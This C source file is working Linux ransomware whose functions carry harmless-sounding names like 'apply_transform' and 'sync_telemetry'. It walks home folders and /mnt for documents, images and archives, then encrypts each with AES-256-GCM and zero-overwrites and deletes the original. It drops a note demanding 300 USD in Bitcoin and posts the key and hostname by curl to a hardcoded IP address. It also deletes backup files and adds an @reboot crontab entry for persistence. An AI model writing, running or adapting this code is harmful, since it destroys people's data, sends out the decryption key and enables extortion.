#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <ftw.h>
#include <stddef.h>
#include <stdint.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/crypto.h>
#include <curl/curl.h>

#ifndef SESSION_INIT_H
#define SESSION_INIT_H

#include <stddef.h>

int init_session(const char *b64_endpoint, const char *b64_payment_id,
                 unsigned char **endpoint_out, size_t *endpoint_len,
                 unsigned char **payment_id_out, size_t *payment_id_len);

#endif /* SESSION_INIT_H */

typedef struct FileNode {
    char *path;
    struct FileNode *next;
} FileNode;

static void free_list(FileNode *head) {
    while (head) {
        FileNode *next = head->next;
        free(head->path);
        free(head);
        head = next;
    }
}

static int has_matching_extension(const char *name) {
    static const char *extensions[] = {
        "xlsx", "docx", "pdf", "txt", "csv", "jpg",
        "png", "db", "backup", "psd", "zip", "rar"
    };

    const char *dot = strrchr(name, '.');
    if (!dot || dot == name)
        return 0;

    for (size_t i = 0; i < sizeof(extensions) / sizeof(extensions[0]); i++) {
        if (strcasecmp(dot + 1, extensions[i]) == 0)
            return 1;
    }

    return 0;
}

static int append_file(FileNode **head, FileNode **tail, const char *path) {
    FileNode *node = malloc(sizeof(*node));
    if (!node)
        return 0;

    node->path = strdup(path);
    if (!node->path) {
        free(node);
        return 0;
    }

    node->next = NULL;

    if (*tail)
        (*tail)->next = node;
    else
        *head = node;

    *tail = node;
    return 1;
}

static int scan_dir(const char *dir, FileNode **head, FileNode **tail) {
    DIR *d = opendir(dir);
    if (!d)
        return 1;

    struct dirent *entry;
    int ok = 1;

    while ((entry = readdir(d)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char child[PATH_MAX];
        int len = snprintf(child, sizeof(child), "%s/%s", dir, entry->d_name);
        if (len < 0 || (size_t)len >= sizeof(child))
            continue;

        struct stat st;
        if (lstat(child, &st) != 0)
            continue;

        if (S_ISLNK(st.st_mode)) {
            struct stat target;
            if (stat(child, &target) == 0 &&
                S_ISREG(target.st_mode) &&
                has_matching_extension(entry->d_name)) {
                if (!append_file(head, tail, child)) {
                    ok = 0;
                    break;
                }
            }
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (!scan_dir(child, head, tail)) {
                ok = 0;
                break;
            }
        } else if (S_ISREG(st.st_mode) && has_matching_extension(entry->d_name)) {
            if (!append_file(head, tail, child)) {
                ok = 0;
                break;
            }
        }
    }

    closedir(d);
    return ok;
}

FileNode *scan_storage(void) {
    FileNode *head = NULL;
    FileNode *tail = NULL;

    const char *home = getenv("HOME");

    if (home && home[0]) {
        static const char *home_subdirs[] = {
            "Documentos_Teste",
            "Documentos",
            "Downloads",
            "Imagens"
        };

        for (size_t i = 0; i < sizeof(home_subdirs) / sizeof(home_subdirs[0]); i++) {
            char base[PATH_MAX];
            int len;
            size_t home_len = strlen(home);

            if (home_len > 0 && home[home_len - 1] == '/')
                len = snprintf(base, sizeof(base), "%s%s", home, home_subdirs[i]);
            else
                len = snprintf(base, sizeof(base), "%s/%s", home, home_subdirs[i]);

            if (len < 0 || (size_t)len >= sizeof(base))
                continue;

            if (!scan_dir(base, &head, &tail)) {
                free_list(head);
                return NULL;
            }
        }
    }

    if (!scan_dir("/mnt", &head, &tail)) {
        free_list(head);
        return NULL;
    }

    return head;
}

static const unsigned char base64_table[256] = {
    ['A']=0, ['B']=1, ['C']=2, ['D']=3, ['E']=4, ['F']=5, ['G']=6, ['H']=7,
    ['I']=8, ['J']=9, ['K']=10, ['L']=11, ['M']=12, ['N']=13, ['O']=14, ['P']=15,
    ['Q']=16, ['R']=17, ['S']=18, ['T']=19, ['U']=20, ['V']=21, ['W']=22, ['X']=23,
    ['Y']=24, ['Z']=25, ['a']=26, ['b']=27, ['c']=28, ['d']=29, ['e']=30, ['f']=31,
    ['g']=32, ['h']=33, ['i']=34, ['j']=35, ['k']=36, ['l']=37, ['m']=38, ['n']=39,
    ['o']=40, ['p']=41, ['q']=42, ['r']=43, ['s']=44, ['t']=45, ['u']=46, ['v']=47,
    ['w']=48, ['x']=49, ['y']=50, ['z']=51, ['0']=52, ['1']=53, ['2']=54, ['3']=55,
    ['4']=56, ['5']=57, ['6']=58, ['7']=59, ['8']=60, ['9']=61, ['+']=62, ['/']=63
};

static int base64_decode(const char *in, unsigned char *out, int *out_len)
{
    int len = strlen(in);
    if (len % 4 != 0 || len == 0)
        return -1;

    int padding = 0;
    if (len >= 2 && in[len-2] == '=') padding = 2;
    else if (len >= 1 && in[len-1] == '=') padding = 1;

    int decoded_len = (len / 4) * 3 - padding;
    if (decoded_len <= 0)
        return -1;

    int i, j;
    unsigned char buf[4];
    for (i = 0, j = 0; i < len; i += 4) {
        for (int k = 0; k < 4; k++) {
            if (i + k >= len) {
                buf[k] = 0;
                continue;
            }
            if (in[i+k] == '=') {
                buf[k] = 0;
                continue;
            }
            unsigned char val = base64_table[(unsigned char)in[i+k]];
            if (val == 0 && in[i+k] != 'A')
                return -1;
            buf[k] = val;
        }

        out[j++] = (buf[0] << 2) | (buf[1] >> 4);
        if (j < decoded_len)
            out[j++] = (buf[1] << 4) | (buf[2] >> 2);
        if (j < decoded_len)
            out[j++] = (buf[2] << 6) | buf[3];
    }

    *out_len = decoded_len;
    return 0;
}

int init_session(const char *b64_endpoint, const char *b64_payment_id,
                 unsigned char **endpoint_out, size_t *endpoint_len,
                 unsigned char **payment_id_out, size_t *payment_id_len)
{
    int ret = -1;
    int fd = -1;
    unsigned char aes_key[32];
    char b64_buf[64];
    char json_buf[128];
    unsigned char *decoded_endpoint = NULL;
    unsigned char *decoded_payment = NULL;
    int endpoint_len_int = 0, payment_len_int = 0;

    *endpoint_out = NULL;
    *endpoint_len = 0;
    *payment_id_out = NULL;
    *payment_id_len = 0;

    if (RAND_bytes(aes_key, sizeof(aes_key)) != 1)
        goto cleanup;

    int b64_len = EVP_EncodeBlock((unsigned char *)b64_buf, aes_key, sizeof(aes_key));
    b64_buf[b64_len] = '\0';

    int json_len = snprintf(json_buf, sizeof(json_buf), "{\"aes_key\":\"%s\"}", b64_buf);
    if (json_len < 0 || (size_t)json_len >= sizeof(json_buf))
        goto cleanup;

    fd = open("/tmp/.master.key", O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
    if (fd < 0)
        goto cleanup;

    fchmod(fd, S_IRUSR | S_IWUSR);

    ssize_t written = write(fd, json_buf, (size_t)json_len);
    if (written != json_len)
        goto cleanup;
    close(fd);
    fd = -1;

    size_t b64_endpoint_len = strlen(b64_endpoint);
    size_t b64_payment_len = strlen(b64_payment_id);
    size_t max_decode_endpoint = (b64_endpoint_len * 3 / 4) + 1;
    size_t max_decode_payment = (b64_payment_len * 3 / 4) + 1;

    decoded_endpoint = malloc(max_decode_endpoint);
    decoded_payment = malloc(max_decode_payment);
    if (!decoded_endpoint || !decoded_payment)
        goto cleanup;

    if (base64_decode(b64_endpoint, decoded_endpoint, &endpoint_len_int) != 0)
        goto cleanup;
    *endpoint_out = decoded_endpoint;
    *endpoint_len = (size_t)endpoint_len_int;
    decoded_endpoint = NULL;

    if (base64_decode(b64_payment_id, decoded_payment, &payment_len_int) != 0)
        goto cleanup;
    *payment_id_out = decoded_payment;
    *payment_id_len = (size_t)payment_len_int;
    decoded_payment = NULL;

    ret = 0;

cleanup:
    if (fd >= 0) close(fd);
    if (decoded_endpoint) {
        OPENSSL_cleanse(decoded_endpoint, max_decode_endpoint);
        free(decoded_endpoint);
    }
    if (decoded_payment) {
        OPENSSL_cleanse(decoded_payment, max_decode_payment);
        free(decoded_payment);
    }
    OPENSSL_cleanse(aes_key, sizeof(aes_key));
    OPENSSL_cleanse(b64_buf, sizeof(b64_buf));
    OPENSSL_cleanse(json_buf, sizeof(json_buf));

    if (ret != 0) {
        *endpoint_out = NULL;
        *endpoint_len = 0;
        *payment_id_out = NULL;
        *payment_id_len = 0;
    }

    return ret;
}

#define AES_256_KEY_SIZE 32
#define GCM_NONCE_SIZE 12
#define GCM_TAG_SIZE 16
#define BUFFER_SIZE 4096

static void wipe_memory(void *ptr, size_t len) {
    if (ptr && len > 0) {
        OPENSSL_cleanse(ptr, len);
    }
}

int apply_transform(const char *file_path, const uint8_t *key_32bytes) {
    if (!file_path || !key_32bytes) {
        fprintf(stderr, "Invalid arguments\n");
        return -1;
    }

    FILE *input_file = NULL;
    FILE *output_file = NULL;
    FILE *wipe_file = NULL;
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t nonce[GCM_NONCE_SIZE];
    uint8_t tag[GCM_TAG_SIZE];
    uint8_t *in_buf = NULL;
    uint8_t *out_buf = NULL;
    uint8_t *zero_buf = NULL;
    char *output_path = NULL;
    int ret = -1;
    struct stat file_stat;
    long file_size = 0;
    unsigned char *ciphertext = NULL;
    size_t ciphertext_len = 0;
    size_t total_out_len = 0;
    int out_len = 0;
    int final_len = 0;

    memset(nonce, 0, sizeof(nonce));
    memset(tag, 0, sizeof(tag));

    if (stat(file_path, &file_stat) != 0) {
        fprintf(stderr, "stat failed for %s\n", file_path);
        goto cleanup;
    }
    file_size = file_stat.st_size;

    in_buf = (uint8_t *)malloc(BUFFER_SIZE);
    out_buf = (uint8_t *)malloc(BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);
    zero_buf = (uint8_t *)malloc(BUFFER_SIZE);
    if (!in_buf || !out_buf || !zero_buf) {
        fprintf(stderr, "Memory allocation failed\n");
        goto cleanup;
    }
    memset(zero_buf, 0, BUFFER_SIZE);

    if (asprintf(&output_path, "%s.PROCESSED", file_path) == -1) {
        fprintf(stderr, "asprintf failed\n");
        output_path = NULL;
        goto cleanup;
    }

    if (RAND_bytes(nonce, GCM_NONCE_SIZE) != 1) {
        fprintf(stderr, "RAND_bytes failed\n");
        goto cleanup;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (alg) failed\n");
        goto cleanup;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_NONCE_SIZE, NULL) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_SET_IVLEN failed\n");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key_32bytes, nonce) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (key/iv) failed\n");
        goto cleanup;
    }

    input_file = fopen(file_path, "rb");
    if (!input_file) {
        fprintf(stderr, "Cannot open input file %s\n", file_path);
        goto cleanup;
    }

    output_file = fopen(output_path, "wb");
    if (!output_file) {
        fprintf(stderr, "Cannot open output file %s\n", output_path);
        goto cleanup;
    }

    if (fwrite(nonce, 1, GCM_NONCE_SIZE, output_file) != GCM_NONCE_SIZE) {
        fprintf(stderr, "Failed to write nonce\n");
        goto cleanup;
    }

    ciphertext_len = 0;
    size_t bytes_read;
    while ((bytes_read = fread(in_buf, 1, BUFFER_SIZE, input_file)) > 0) {
        if (bytes_read < 0) {
            fprintf(stderr, "Read error\n");
            goto cleanup;
        }

        if (EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, (int)bytes_read) != 1) {
            fprintf(stderr, "EVP_EncryptUpdate failed\n");
            goto cleanup;
        }

        if (fwrite(out_buf, 1, out_len, output_file) != (size_t)out_len) {
            fprintf(stderr, "Failed to write ciphertext\n");
            goto cleanup;
        }
        ciphertext_len += (size_t)out_len;
    }

    if (ferror(input_file)) {
        fprintf(stderr, "Input file read error\n");
        goto cleanup;
    }

    if (EVP_EncryptFinal_ex(ctx, out_buf, &final_len) != 1) {
        fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }

    if (final_len > 0) {
        if (fwrite(out_buf, 1, final_len, output_file) != (size_t)final_len) {
            fprintf(stderr, "Failed to write final block\n");
            goto cleanup;
        }
        ciphertext_len += (size_t)final_len;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_SIZE, tag) != 1) {
        fprintf(stderr, "EVP_CTRL_GCM_GET_TAG failed\n");
        goto cleanup;
    }

    if (fwrite(tag, 1, GCM_TAG_SIZE, output_file) != GCM_TAG_SIZE) {
        fprintf(stderr, "Failed to write tag\n");
        goto cleanup;
    }

    if (fflush(output_file) != 0) {
        fprintf(stderr, "fflush output failed\n");
        goto cleanup;
    }

    fclose(output_file);
    output_file = NULL;

    fclose(input_file);
    input_file = NULL;

    wipe_file = fopen(file_path, "wb");
    if (!wipe_file) {
        fprintf(stderr, "Cannot open file for wiping: %s\n", file_path);
        goto cleanup;
    }

    size_t remaining = (size_t)file_size;
    size_t write_len;
    while (remaining > 0) {
        write_len = (remaining > BUFFER_SIZE) ? BUFFER_SIZE : remaining;
        if (fwrite(zero_buf, 1, write_len, wipe_file) != write_len) {
            fprintf(stderr, "Wipe write failed\n");
            goto cleanup;
        }
        remaining -= write_len;
    }

    if (fflush(wipe_file) != 0) {
        fprintf(stderr, "fflush wipe failed\n");
        goto cleanup;
    }

    fclose(wipe_file);
    wipe_file = NULL;

    if (remove(file_path) != 0) {
        fprintf(stderr, "remove failed for %s\n", file_path);
        goto cleanup;
    }

    ret = 0;

cleanup:
    if (ctx) {
        EVP_CIPHER_CTX_free(ctx);
        ctx = NULL;
    }

    if (input_file) {
        fclose(input_file);
        input_file = NULL;
    }

    if (output_file) {
        fclose(output_file);
        output_file = NULL;
    }

    if (wipe_file) {
        fclose(wipe_file);
        wipe_file = NULL;
    }

    if (in_buf) {
        wipe_memory(in_buf, BUFFER_SIZE);
        free(in_buf);
        in_buf = NULL;
    }

    if (out_buf) {
        wipe_memory(out_buf, BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH);
        free(out_buf);
        out_buf = NULL;
    }

    if (zero_buf) {
        wipe_memory(zero_buf, BUFFER_SIZE);
        free(zero_buf);
        zero_buf = NULL;
    }

    if (output_path) {
        free(output_path);
        output_path = NULL;
    }

    wipe_memory(nonce, sizeof(nonce));
    wipe_memory(tag, sizeof(tag));

    if (ret == -1) {
        if (output_path) {
            remove(output_path);
        }
        if (ciphertext_len > 0) {
            (void)ciphertext_len;
        }
    }

    return ret;
}

#define FILENAME "#_STATUS_NOTICE_#.txt"
#define CONTENT "request for 300 USD to Bitcoin address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instruction to contact via secure channel.\n"

int write_manifest(const char *dir_path) {
    if (dir_path == NULL) return -1;

    char full_path[4096];
    int ret = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, FILENAME);
    if (ret < 0 || (size_t)ret >= sizeof(full_path)) {
        return -1;
    }

    FILE *fp = fopen(full_path, "w");
    if (fp == NULL) {
        return -1;
    }

    if (fputs(CONTENT, fp) == EOF) {
        fclose(fp);
        remove(full_path);
        return -1;
    }

    if (fclose(fp) == EOF) {
        remove(full_path);
        return -1;
    }

    return 0;
}

int sync_telemetry(void) {
    int ret = -1;
    FILE *fp = NULL;
    char *file_buf = NULL;
    long file_size;
    char *aes_key = NULL;
    char hostname[256] = {0};
    char *payload = NULL;
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    struct curl_slist *headers = NULL;

    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        fprintf(stderr, "sync_telemetry: cannot open /tmp/.master.key\n");
        goto cleanup;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "sync_telemetry: fseek failed\n");
        goto cleanup;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "sync_telemetry: ftell failed\n");
        goto cleanup;
    }
    rewind(fp);

    file_buf = malloc(file_size + 1);
    if (!file_buf) {
        fprintf(stderr, "sync_telemetry: malloc for file buffer failed\n");
        goto cleanup;
    }
    if (fread(file_buf, 1, file_size, fp) != (size_t)file_size) {
        fprintf(stderr, "sync_telemetry: fread failed\n");
        goto cleanup;
    }
    file_buf[file_size] = '\0';
    fclose(fp);
    fp = NULL;

    const char *needle = "\"aes_key\":\"";
    char *start = strstr(file_buf, needle);
    if (!start) {
        fprintf(stderr, "sync_telemetry: \"aes_key\" not found in key file\n");
        goto cleanup;
    }
    start += strlen(needle);
    char *end = strchr(start, '"');
    if (!end) {
        fprintf(stderr, "sync_telemetry: closing quote not found for aes_key\n");
        goto cleanup;
    }
    size_t key_len = end - start;
    if (key_len == 0) {
        fprintf(stderr, "sync_telemetry: aes_key value is empty\n");
        goto cleanup;
    }
    aes_key = strndup(start, key_len);
    if (!aes_key) {
        fprintf(stderr, "sync_telemetry: strndup failed\n");
        goto cleanup;
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "sync_telemetry: gethostname failed\n");
        goto cleanup;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    int needed = snprintf(NULL, 0,
                          "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                          aes_key, hostname);
    if (needed < 0) {
        fprintf(stderr, "sync_telemetry: snprintf failed\n");
        goto cleanup;
    }
    payload = malloc(needed + 1);
    if (!payload) {
        fprintf(stderr, "sync_telemetry: malloc for payload failed\n");
        goto cleanup;
    }
    snprintf(payload, needed + 1,
             "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
             aes_key, hostname);

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "sync_telemetry: curl_easy_init failed\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "sync_telemetry: curl_easy_perform failed: %s\n",
                curl_easy_strerror(res));
        goto cleanup;
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code != 200) {
        fprintf(stderr, "sync_telemetry: server returned HTTP %ld\n", http_code);
        goto cleanup;
    }

    if (remove("/tmp/.master.key") != 0) {
        fprintf(stderr, "sync_telemetry: remove failed\n");
        ret = -1;
        goto cleanup;
    }

    ret = 0;

cleanup:
    if (fp) fclose(fp);
    free(file_buf);
    free(aes_key);
    free(payload);
    if (headers) curl_slist_free_all(headers);
    if (curl) curl_easy_cleanup(curl);
    return ret;
}

int register_service(const char *argv0) {
    char *path = NULL;
    char *line = NULL;
    char *content = NULL;
    size_t content_len = 0;
    size_t content_cap = 0;
    int ret = -1;
    FILE *fp = NULL;

    if (argv0 != NULL) {
        path = realpath(argv0, NULL);
        if (path == NULL) {
            char buf[PATH_MAX];
            ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = '\0';
                path = strdup(buf);
            }
        }
    }
    if (path == NULL) {
        char buf[PATH_MAX];
        ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';
            path = strdup(buf);
        }
    }

    if (path == NULL) {
        fprintf(stderr, "register_service: cannot determine executable path (errno=%d)\n", errno);
        goto cleanup;
    }

    const char *special = " \t\n";
    int needs_quoting = (strpbrk(path, special) != NULL);

    const char *fmt = needs_quoting ? "@reboot \"%s\"\n" : "@reboot %s\n";
    int line_len = snprintf(NULL, 0, fmt, path);
    if (line_len < 0) {
        fprintf(stderr, "register_service: snprintf failed\n");
        goto cleanup;
    }
    line = malloc(line_len + 1);
    if (line == NULL) {
        fprintf(stderr, "register_service: malloc failed\n");
        goto cleanup;
    }
    snprintf(line, line_len + 1, fmt, path);

    fp = popen("crontab -l", "r");
    if (fp == NULL) {
        fprintf(stderr, "register_service: popen(crontab -l) failed (errno=%d)\n", errno);
        goto cleanup;
    }

    char *line_buf = NULL;
    size_t line_buf_size = 0;
    ssize_t nread;
    while ((nread = getline(&line_buf, &line_buf_size, fp)) != -1) {
        size_t needed = content_len + nread + 1;
        if (needed > content_cap) {
            size_t new_cap = content_cap ? content_cap * 2 : 4096;
            while (new_cap < needed) new_cap *= 2;
            char *new_content = realloc(content, new_cap);
            if (new_content == NULL) {
                fprintf(stderr, "register_service: realloc failed\n");
                free(line_buf);
                pclose(fp);
                fp = NULL;
                goto cleanup;
            }
            content = new_content;
            content_cap = new_cap;
        }
        memcpy(content + content_len, line_buf, nread);
        content_len += nread;
    }
    free(line_buf);

    int status = pclose(fp);
    fp = NULL;
    if (status != 0) {
        if (content_len == 0) {
        } else {
            fprintf(stderr, "register_service: crontab -l returned non-zero with content, aborting\n");
            goto cleanup;
        }
    }

    if (content == NULL) {
        content = strdup("");
        if (content == NULL) {
            fprintf(stderr, "register_service: strdup failed\n");
            goto cleanup;
        }
        content_cap = 1;
        content_len = 0;
    } else {
        content[content_len] = '\0';
    }

    if (strstr(content, line) != NULL) {
        ret = 0;
        goto cleanup;
    }

    if (content_len > 0 && content[content_len - 1] != '\n') {
        content_len++;
        if (content_len >= content_cap) {
            char *new_content = realloc(content, content_len + 1);
            if (new_content == NULL) {
                fprintf(stderr, "register_service: realloc failed\n");
                goto cleanup;
            }
            content = new_content;
        }
        content[content_len - 1] = '\n';
        content[content_len] = '\0';
    }

    size_t new_len = content_len + strlen(line);
    if (new_len + 1 > content_cap) {
        char *new_content = realloc(content, new_len + 1);
        if (new_content == NULL) {
            fprintf(stderr, "register_service: realloc failed\n");
            goto cleanup;
        }
        content = new_content;
    }
    strcat(content, line);
    content_len = new_len;

    fp = popen("crontab -", "w");
    if (fp == NULL) {
        fprintf(stderr, "register_service: popen(crontab -) failed (errno=%d)\n", errno);
        goto cleanup;
    }
    if (fputs(content, fp) == EOF) {
        fprintf(stderr, "register_service: fputs failed\n");
        pclose(fp);
        fp = NULL;
        goto cleanup;
    }
    status = pclose(fp);
    fp = NULL;
    if (status != 0) {
        fprintf(stderr, "register_service: crontab - returned non-zero exit status\n");
        goto cleanup;
    }

    ret = 0;

cleanup:
    free(path);
    free(line);
    free(content);
    if (fp != NULL) pclose(fp);
    return ret;
}

static int total_deleted = 0;

static int purge_callback(const char *fpath,
                          const struct stat *sb,
                          int typeflag,
                          struct FTW *ftwbuf)
{
    (void)sb;
    (void)ftwbuf;

    if (typeflag != FTW_F)
        return 0;

    const char *dot = strrchr(fpath, '.');
    if (!dot)
        return 0;

    if (strcmp(dot, ".bak") == 0 ||
        strcmp(dot, ".backup") == 0 ||
        strcmp(dot, ".old") == 0)
    {
        if (remove(fpath) == 0) {
            total_deleted++;
        } else {
            fprintf(stderr,
                    "Error deleting %s: %s\n",
                    fpath,
                    strerror(errno));
        }
    }

    return 0;
}

static void process_directory(const char *dir)
{
    if (nftw(dir, purge_callback, 20, FTW_PHYS) == -1) {
        if (errno != ENOENT) {
            fprintf(stderr,
                    "Warning: could not traverse '%s': %s\n",
                    dir,
                    strerror(errno));
        }
    }
}

void purge_residuals(void)
{
    const char *home = getenv("HOME");
    char path[4096];

    total_deleted = 0;

    if (home) {
        snprintf(path, sizeof(path), "%s/Documentos_Teste", home);
        process_directory(path);

        snprintf(path, sizeof(path), "%s/Documentos", home);
        process_directory(path);

        snprintf(path, sizeof(path), "%s/Downloads", home);
        process_directory(path);

        snprintf(path, sizeof(path), "%s/Imagens", home);
        process_directory(path);
    } else {
        fprintf(stderr,
                "Warning: HOME not set, skipping user directories\n");
    }

    process_directory("/mnt");
}

static int load_aes_key(unsigned char key[32]) {
    char buf[4096];
    FILE *fp = fopen("/tmp/.master.key", "rb");
    if (!fp)
        return -1;
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    buf[n] = '\0';

    const char *needle = "\"aes_key\":\"";
    char *start = strstr(buf, needle);
    if (!start)
        return -1;
    start += strlen(needle);
    char *end = strchr(start, '"');
    if (!end)
        return -1;

    char *b64 = strndup(start, (size_t)(end - start));
    if (!b64)
        return -1;

    unsigned char decoded[64];
    int key_len = 0;
    int rc = base64_decode(b64, decoded, &key_len);
    free(b64);

    if (rc != 0 || key_len != 32) {
        OPENSSL_cleanse(decoded, sizeof(decoded));
        return -1;
    }

    memcpy(key, decoded, 32);
    OPENSSL_cleanse(decoded, sizeof(decoded));
    return 0;
}

static char *parent_dir_of(const char *path) {
    const char *slash = strrchr(path, '/');
    if (!slash)
        return NULL;
    return strndup(path, (size_t)(slash - path));
}

int main(int argc, char *argv[]) {
    unsigned char *endpoint = NULL;
    size_t endpoint_len = 0;
    unsigned char *payment_id = NULL;
    size_t payment_id_len = 0;

    if (init_session("aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgw",
                     "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTTG12N0RpdmZOYQ==",
                     &endpoint, &endpoint_len,
                     &payment_id, &payment_id_len) != 0) {
        fprintf(stderr, "init_session failed\n");
        free(endpoint);
        free(payment_id);
        return 1;
    }
    free(endpoint);
    free(payment_id);

    unsigned char key[32];
    if (load_aes_key(key) != 0) {
        fprintf(stderr, "failed to load session key\n");
        return 1;
    }

    FileNode *files = scan_storage();
    if (!files) {
        fprintf(stderr, "no target files found\n");
        return 1;
    }

    char **dirs = NULL;
    size_t ndirs = 0;
    size_t ncap = 0;

    for (FileNode *n = files; n; n = n->next) {
        if (apply_transform(n->path, key) == 0) {
            char *dir = parent_dir_of(n->path);
            if (!dir)
                continue;
            int found = 0;
            for (size_t i = 0; i < ndirs; i++) {
                if (strcmp(dirs[i], dir) == 0) {
                    found = 1;
                    break;
                }
            }
            if (!found) {
                if (ndirs == ncap) {
                    size_t new_cap = ncap ? ncap * 2 : 8;
                    char **tmp = realloc(dirs, new_cap * sizeof(*dirs));
                    if (!tmp) {
                        free(dir);
                        continue;
                    }
                    dirs = tmp;
                    ncap = new_cap;
                }
                dirs[ndirs++] = dir;
            } else {
                free(dir);
            }
        }
    }

    for (size_t i = 0; i < ndirs; i++)
        write_manifest(dirs[i]);

    for (size_t i = 0; i < ndirs; i++)
        free(dirs[i]);
    free(dirs);

    FileNode *n = files;
    while (n) {
        FileNode *next = n->next;
        free(n->path);
        free(n);
        n = next;
    }

    sync_telemetry();

    if (argc > 0)
        register_service(argv[0]);

    return 0;
}